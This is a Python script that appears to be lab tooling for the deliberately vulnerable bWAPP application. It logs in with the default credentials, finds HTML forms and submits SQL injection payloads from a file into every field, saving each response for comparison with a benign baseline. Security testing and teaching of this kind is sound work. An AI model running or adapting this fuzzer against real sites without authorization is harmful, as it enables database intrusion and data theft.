import json
import requests
from parser import HTMLForm
from parser import HTMLTargetParser

#Method for logging into the application and creating a Session for accessing the 
#different vulnerable pages in the bWAPP server for demonstration and testing
def loginIntoBWAPPApplication(loginUrl):
    session = requests.Session()
    loginPayload = {'login':'bee','password':'bug','security_level':'0','form':'submit'}
    login = session.post(loginUrl, data=loginPayload)
    return session
    
#Method for parsing the web page and finding all HTML forms 
def parseHtmlPage(url,session):
    r = session.get(url)
    print ("[+] Response received. Parsing HTML Document in order to detect FORMS")
    targetParser = HTMLTargetParser()
    targetParser.feed(r.text)
    if not targetParser.formList:
        print ("[-] The given URL had no forms for targetting")
        exit()
    return targetParser

#Method for creating the dictionary data structure according to the referred HTML Form
#The dictonary structure will be used in the POST/GET requests
def createDictionary(form,value = None):
    dataValues={}
    for dataField in form.elementList:
        #The default dictionary is constructed using the inaltered value of the elements in the HTML
        if value is None:
            dataValues.update({dataField[1]:dataField[3]})
        else:
            #The action field of a button will not be processed by SQL
            if str.lower(dataField[1]) == 'action':
                dataValues.update({dataField[1]:dataField[3]})
            else:
                dataValues.update({dataField[1]:value})
    return dataValues

def sendRequestAndSaveResponse(url,session,dataValues,requestType,fileName):
    if (requestType == 'POST'):
        dataValues.update({'action':'search'})
        s = session.post(url, data = dataValues)  
    if (requestType == 'GET'):
        s = session.get(url, params = dataValues)
    f = open(fileName,'w')
    f.write(s.text)
    f.close()
            
def BEGIN():
	res = ["URL"]
	return res

def RUN(file_name):
    loginUrl ='http://192.168.0.43/bWAPP/login.php'
    url = 'http://192.168.0.43/bWAPP/sqli_6.php'
    nonMaliciousValue='cebola'
    attemptsFolder='attempts/'
    filePrefix = 'form-'
    nonMaliciousResponseFileName = '-nonMaliciousAttempt'
    maliciousResponseFileName = '-attempt-'
    payloadFileName='sql_inj_payload'

    session = loginIntoBWAPPApplication(loginUrl)
    print ("[+] Sending request for the URL web page")
    targetParser = parseHtmlPage(url,session)
    targetFormList = targetParser.formList
    print ("[+] Parsing completed")

    print ("[+] The following FORMS were found in the HTML document:")
    for index,form in enumerate(targetParser.formList):
        dataValues = createDictionary(form)
        requestType = form.formType
        print (" ID: #" + str(index) + " : " + requestType + " form with the following fields:")
        print (dataValues)

    print ("Which of the forms will be tested? (space-separated ID list) or (all)")
    options = input()

    if str.lower(options) != 'all':
        idList = [int(i) for i in options.split()]
    else:
        idList = range(0,len(targetFormList))
    
    for id in idList:
        form = targetFormList[id]
        dataValues = createDictionary(form,nonMaliciousValue)
        filePath = attemptsFolder + filePrefix + str(id) + nonMaliciousResponseFileName
        requestType = form.formType
        print("[+] Sending non malicious request for FORM #" + str(id))
        sendRequestAndSaveResponse(url,session,dataValues,requestType,filePath)
        payloadFile = open(payloadFileName,'r')
        for attempt,payload in enumerate(payloadFile.read().splitlines()): 
            dataValues = createDictionary(form,payload)
            filePath = attemptsFolder + filePrefix+ str(id) + maliciousResponseFileName + str(attempt)
            requestType=form.formType
            print("[+] Sending request for FORM #" + str(id) + ". PAYLOAD: " + payload)
            sendRequestAndSaveResponse(url,session,dataValues,requestType,filePath)
        payloadFile.close()
        print("[+] Finished all requests for FORM #" + str(id))
RUN("")